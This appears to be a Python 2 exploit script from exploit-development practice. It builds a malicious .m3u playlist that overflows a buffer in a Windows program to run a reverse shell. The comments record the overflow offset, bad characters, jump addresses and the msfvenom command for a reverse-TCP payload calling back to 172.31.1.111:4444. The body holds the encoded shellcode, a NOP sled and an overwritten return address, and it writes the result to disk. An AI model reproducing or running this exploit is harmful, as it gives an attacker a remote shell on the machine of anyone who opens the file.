'''
Jump full 94*2 forward with sub esp, 5e(94)*3  before shellcode to fix crashing
'''

file = "evilconv6.m3u"

#eip 1100
#ffe4 01d6f23a
#badchars  \x00,\x09, \x0a
#pop pop retn 01b36a10
#01b257f6 PUSH ESP, RETN
#pattern offset for A's xact match at offset 257
#sub 3000 from esp to fix shellcode break  \x83\xec\x5e"*3  sub esp, 5e



#msfvenom -a x86 -p windows/shell/reverse_tcp LHOST=172.31.1.111 LPORT=4444 -f c -e x86/shikata_ga_nai -b "\x00\x09\x0a"


#shellcode ="\x90"*20
shellcode = "\x83\xec\x5e"*3
shellcode +=("\xd9\xe5\xb8\x86\x06\x2d\x42\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x31\x83\xed\xfc\x31\x45\x14\x03\x45\x92\xe4\xd8\xbe\x72\x6a"
"\x22\x3f\x82\x0b\xaa\xda\xb3\x0b\xc8\xaf\xe3\xbb\x9a\xe2\x0f"
"\x37\xce\x16\x84\x35\xc7\x19\x2d\xf3\x31\x17\xae\xa8\x02\x36"
"\x2c\xb3\x56\x98\x0d\x7c\xab\xd9\x4a\x61\x46\x8b\x03\xed\xf5"
"\x3c\x20\xbb\xc5\xb7\x7a\x2d\x4e\x2b\xca\x4c\x7f\xfa\x41\x17"
"\x5f\xfc\x86\x23\xd6\xe6\xcb\x0e\xa0\x9d\x3f\xe4\x33\x74\x0e"
"\x05\x9f\xb9\xbf\xf4\xe1\xfe\x07\xe7\x97\xf6\x74\x9a\xaf\xcc"
"\x07\x40\x25\xd7\xaf\x03\x9d\x33\x4e\xc7\x78\xb7\x5c\xac\x0f"
"\x9f\x40\x33\xc3\xab\x7c\xb8\xe2\x7b\xf5\xfa\xc0\x5f\x5e\x58"
"\x68\xf9\x3a\x0f\x95\x19\xe5\xf0\x33\x51\x0b\xe4\x49\x38\x41"
"\xfb\xdc\x46\x27\xfb\xde\x48\x17\x94\xef\xc3\xf8\xe3\xef\x01"
"\xbd\x1c\xba\x08\x97\xb4\x63\xd9\xaa\xd8\x93\x37\xe8\xe4\x17"
"\xb2\x90\x12\x07\xb7\x95\x5f\x8f\x2b\xe7\xf0\x7a\x4c\x54\xf0"
"\xae\x2f\x3b\x62\x32\x9e\xde\x02\xd1\xde")






stage1 = "\x90"*250 
nops1 = "\x90"*20
#shellcode
stage2 = "A"*(26100-(len(stage1)+len(nops1)+len(shellcode)))
espspace = "\x90"*4 #Spacer to hit ESP
eip = "\x3a\xf2\xd6\x01" #JMP ESP
espadd = "\x83\xc4\x5e\x83\xc4\x5e\x83\xc4\x5e"
jmpesp = "\xff\xe4"



buffer = stage1 + nops1 + shellcode + stage2 + eip + espspace + espadd + jmpesp

print len(stage1)+len(nops1)+len(stage2)+len(shellcode)
print len(stage2)


f = open(file, 'w')
f.write(buffer)
f.close()

